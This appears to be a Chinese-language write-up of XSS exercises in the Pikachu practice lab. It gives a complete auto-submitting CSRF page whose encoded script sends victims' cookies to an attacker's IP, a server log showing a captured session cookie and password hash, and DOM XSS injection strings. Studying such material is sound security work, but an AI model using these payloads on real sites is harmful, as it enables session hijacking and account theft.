# XSS POST DOM 利用


* post型不像get型可以直接製作payload url 丟給受害者

* 需要製作一個CSRF頁面，幫我們的朋友自動提交

* 注意是要真正意義上的瀏覽器跳轉，而不是類似fetch請求

* 例如 form 表單



### 我這邊用的是 Pikachu 的 xss post 實驗。


#### 1. 登入 admin/123456

#### 2. 接下來是注入點可以彈XSS。

#### 3. 接著製作一個CSRF.html

```htmlembedded
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


<form action="http://pika/vul/xss/xsspost/xss_reflected_post.php" method="post">
    <input type="hidden" name="message" value="&lt;script type=&quot;text/javascript&quot;&gt; const url = &#39;http://192.168.43.84/&#39;; const cookies = document.cookie; fetch(url + cookies, {method: &#39;GET&#39;, }) &lt;/script&gt;">

    <input type="submit" name="submit" value="submit">
</form>

<script>
	
    window.onload = function() {
        const submitButton = document.querySelector('input[name="submit"]');
        submitButton.click();
    };
    
</script>

</body>
</html>

```


#### payload 製作過程:


```
原始
<script type="text/javascript">
	const url = 'http://192.168.43.84/';
	const cookies = document.cookie;
	fetch(url + cookies, {
	  method: 'GET',
	})
</script>


縮成一行
<script type="text/javascript"> const url = 'http://192.168.43.84/'; const cookies = document.cookie; fetch(url + cookies, {method: 'GET', }) </script>


因為有太多特殊字元加上單引號會閉合之類的，不想麻煩就直接 html encode

&lt;script type=&quot;text/javascript&quot;&gt; const url = &#39;http://192.168.43.84/&#39;; const cookies = document.cookie; fetch(url + cookies, {method: &#39;GET&#39;, }) &lt;/script&gt;

```


#### 4. 攻擊者的 kali php -S 0.0.0.0:80

我的kali是 192.168.43.84
```
[Sat Aug 12 05:42:09 2023] 192.168.43.96:5115 [404]: GET /ant[uname]=admin;%20ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;%20PHPSESSID=61pa3ovikhp7lameim7eruq0as - No such file or directory

```




## 這邊舉例使用Pikachu DOM型xss 兩題。



### 第一題可以注入，但完全不能利用。


```
<input id="text" name="text" type="text" value="1111">
<input id="button" type="button" value="click me!" onclick="domxss()">
```


### 搜尋domxss
```
<script>
  function domxss() {
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = " < a href = '"+str+"' > what do you see ? < /a>";
  }
  //试试：'>
  < img src = "#"
  onmouseover = "alert('xss')" >
  //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```

所以會產生:
```
<a href="1111">what do you see?</a>
```

注入
```
1111'>123</a><img src=x onerror=alert('XSS')> 會觸發

```

### 想一下攻擊者要怎麼讓使用者的頁面上變成1111，根本無法。
get post 型都是直接請求後端。
dom 則是在前端，所以無法
```
<input id="text" name="text" type="text" value="1111">

```



## DOM型xss-x

這題就不一樣了，他是get
```
<form method="get">
    <input id="text" name="text" type="text" value="1111">
    <input id="submit" type="submit" value="请说出你的伤心往事">
</form>
```

### 提交後發出請求。
```
http://pika/vul/xss/xss_dom_x.php?text=1111
```

### 而出現了一個按紐
```
<a href="#" onclick="domxss()">有些费尽心机想要忘记的事情,后来真的就忘掉了</a>
```

### domxss()
```
<script>

	function domxss() {
	    // 从 URL 查询参数获取参数值
	    var str = window.location.search;

	    //decode GET參數
	    var txss = decodeURIComponent(str.split("text=")[1]);
	    
	    // 替换 '+' 字符为空格
	    var xss = txss.replace(/\+/g, ' ');
	    
	    // 使用获取的参数值创建一个 <a> 元素并插入到 DOM 中
	    document.getElementById("dom").innerHTML = " <a href = '"+xss+"' > 就让往事都随风, 都随风吧 </a>";
	}

  //试试：'>
  < img src = "#"
  onmouseover = "alert('xss')" >
  //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```


### 所以按一下會跑出另一個按紐
```
<a href="1111">就让往事都随风,都随风吧</a>
```


### 由於domxss他會抓取URL GET參數text，所以攻擊者便可以利用。



